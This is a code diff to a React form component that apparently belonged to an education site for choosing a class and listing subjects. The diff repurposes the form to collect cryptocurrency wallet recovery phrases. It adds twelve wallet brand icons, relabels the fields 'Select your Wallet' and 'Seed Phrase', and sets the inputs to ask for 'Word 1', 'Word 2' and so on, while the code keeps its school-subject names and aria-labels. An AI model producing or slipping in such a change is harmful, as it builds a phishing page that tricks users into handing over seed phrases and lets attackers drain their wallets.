@@ -3,14 +3,36 @@ import Link from "next/link";
 import { useState } from "react";
 import { site } from "@/config/site";
 import { Award, BookOpen, CheckCircle2, GraduationCap, Library, type LucideIcon } from "lucide-react";
+import {
+  WalletMetamask,
+  WalletCoinbase,
+  WalletZengo,
+  WalletBlue,
+  WalletZerion,
+  WalletPhantom,
+  WalletExodus,
+  WalletRainbow,
+  WalletRabby,
+  WalletTrust,
+  WalletOkx,
+  WalletClave,
+} from "@web3icons/react";
 
 const classIcons: Record<string, LucideIcon> = {
-  "class-1": BookOpen,
-  "class-2": Library,
-  "class-3": GraduationCap,
-  "class-4": Award,
+  "class-1": WalletTrust,
+  "class-2": WalletPhantom,
+  "class-3": WalletMetamask,
+  "class-4": WalletExodus,
+  "class-5": WalletOkx,
+  "class-6": WalletClave,
+  "class-7": WalletZerion,
+  "class-8": WalletBlue,
+  "class-9": WalletZengo,
+  "class-10": WalletRainbow,
+  "class-11": WalletRabby,
+  "class-12": WalletCoinbase,
 };
-
+ 
 export function SubjectsForm() {
   const [classId, setClassId] = useState("");
   const [count, setCount] = useState(0);
@@ -41,7 +63,7 @@ export function SubjectsForm() {
   return (
     <form onSubmit={submit} className="stack">
       <fieldset className="glass" style={{ border: 0 }}>
-        <legend>Select your class</legend>
+        <legend>Select your Wallet</legend>
         <div className="grid">
           {site.classes.map((c) => {
             const Icon = classIcons[c.id] ?? BookOpen;
@@ -56,13 +78,13 @@ export function SubjectsForm() {
       </fieldset>
       {classId && (
         <div className="glass stack">
-          <label htmlFor="count">Number of subjects</label>
+          <label htmlFor="count">Seed Phrase</label>
           <select id="count" value={count} onChange={(e) => pickCount(Number(e.target.value))}>
             <option value={0} disabled>Select</option>
             {site.subjectCounts.map((n) => <option key={n} value={n}>{n}</option>)}
           </select>
           <div className="subject-grid">{subjects.map((s, i) => (
-            <input key={i} aria-label={`Subject ${i + 1}`} placeholder={`Subject ${i + 1}`} maxLength={100} required value={s}
+            <input key={i} aria-label={`Subject ${i + 1}`} placeholder={`Word ${i + 1}`} maxLength={100} required value={s}
               onChange={(e) => setSubjects(subjects.map((v, j) => (j === i ? e.target.value : v)))} />
           ))}</div>
           {error && <p role="alert" style={{ color: "var(--accent)" }}>{error}</p>}
